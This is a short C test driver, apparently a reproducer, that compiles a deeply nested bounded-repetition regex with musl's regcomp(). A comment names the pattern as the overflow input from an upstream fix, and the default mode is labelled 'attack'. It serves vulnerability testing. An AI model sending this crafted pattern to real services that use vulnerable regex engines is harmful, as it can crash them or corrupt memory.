/* frontier driver — calls pinned, unmodified musl regcomp()/regfree().
 * The ERE is the overflow input named in upstream fix commit 7813e911.
 */
#include <stdio.h>
#include <string.h>
#include <regex.h>

int main(int argc, char **argv)
{
	const char *pat;
	regex_t re;
	int rv;

	if (argc > 1 && !strcmp(argv[1], "safe"))
		pat = "((a|b)*)+c";
	else
		pat = "(((a{255}){255}){255}){255}";

	memset(&re, 0, sizeof(re));
	printf("MODE=%s len=%zu pattern=%s\n", argc > 1 ? argv[1] : "attack",
	       strlen(pat), pat);
	fflush(stdout);
	rv = regcomp(&re, pat, REG_EXTENDED);
	printf("REGCOMP rv=%d re_nsub=%zu\n", rv, re.re_nsub);
	fflush(stdout);
	if (rv == REG_OK)
		regfree(&re);
	return 0;
}
